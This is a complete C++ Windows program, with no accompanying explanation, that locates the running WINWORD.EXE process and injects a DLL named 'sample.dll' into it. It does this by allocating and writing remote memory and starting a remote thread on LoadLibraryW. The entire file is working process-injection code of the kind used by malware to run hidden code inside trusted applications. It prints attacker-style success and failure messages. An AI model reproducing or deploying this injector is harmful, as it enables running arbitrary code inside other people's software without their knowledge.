#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>

bool InjectDLL(DWORD pid, const wchar_t* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::wcerr << L"[-] Failed to open process. Error: " << GetLastError() << std::endl;
        return false;
    }

    size_t len = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    void* remoteStr = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteStr) {
        std::wcerr << L"[-] VirtualAllocEx failed" << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteStr, dllPath, len, NULL)) {
        std::wcerr << L"[-] WriteProcessMemory failed" << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC loadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!loadLibraryW) {
        std::wcerr << L"[-] GetProcAddress failed" << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibraryW,
        remoteStr, 0, NULL);

    if (!hThread) {
        std::wcerr << L"[-] CreateRemoteThread failed" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    DWORD exitCode;

    WaitForSingleObject(hThread, INFINITE);
    std::wcout << L"[+] DLL injected successfully into PID " << pid << std::endl;

    GetExitCodeThread(hThread, &exitCode);

    if (exitCode == 0) {
        std::wcerr << L"[-] LoadLibraryW failed in remote process (exit code = 0)" << std::endl;
    } else {
        std::wcout << L"[+] LoadLibraryW succeeded, DLL base: " << std::hex << exitCode << std::endl;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(entry);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snapshot) return 0;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (!_wcsicmp(entry.szExeFile, processName.c_str())) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

int wmain(int argc, wchar_t* argv[]) {
    DWORD pid = FindProcessId(L"WINWORD.EXE");
    if (!pid) {
        std::wcerr << L"[-] WINWORD.EXE not found!" << std::endl;
        return 1;
    }

    wchar_t fullPath[MAX_PATH];
    GetFullPathNameW(L"sample.dll", MAX_PATH, fullPath, nullptr);
    printf("Now doing the stuff...\n");
    std::wcout << L"[+] Found WINWORD.EXE with PID " << pid << std::endl;
    if (!InjectDLL(pid, fullPath)) {
        std::wcerr << L"[-] Injection failed" << std::endl;
        return 1;
    }

    return 0;
}